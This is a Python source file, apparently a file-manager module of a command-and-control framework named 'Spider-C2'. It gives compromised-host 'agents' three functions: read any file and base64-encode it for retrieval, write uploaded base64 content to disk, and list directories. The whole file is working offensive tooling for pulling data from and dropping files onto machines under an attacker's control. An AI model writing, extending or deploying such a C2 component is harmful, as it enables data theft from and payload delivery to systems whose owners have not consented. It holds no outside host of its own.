"""
Spider-C2 Module : File Manager
Upload and download files from agents.
"""

import os
import base64

class FileManagerModule:
    def __init__(self):
        pass

    def download(self, path):
        try:
            if not os.path.exists(path):
                return f"[!] File not found: {path}"
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            return f"[FILE]{os.path.basename(path)}|{content}"
        except Exception as e:
            return f"[!] Download failed: {e}"

    def upload(self, filename, content, dest_dir="."):
        try:
            filepath = os.path.join(dest_dir, filename)
            with open(filepath, "wb") as f:
                f.write(base64.b64decode(content))
            return f"[+] File uploaded: {filepath}"
        except Exception as e:
            return f"[!] Upload failed: {e}"

    def list_dir(self, path="."):
        try:
            items = os.listdir(path)
            result = [f"Directory: {path}"]
            for item in items:
                full = os.path.join(path, item)
                tag = "[DIR]" if os.path.isdir(full) else "[FILE]"
                size = os.path.getsize(full) if os.path.isfile(full) else 0
                result.append(f"  {tag} {item} ({size} bytes)")
            return "\n".join(result)
        except Exception as e:
            return f"[!] List failed: {e}"
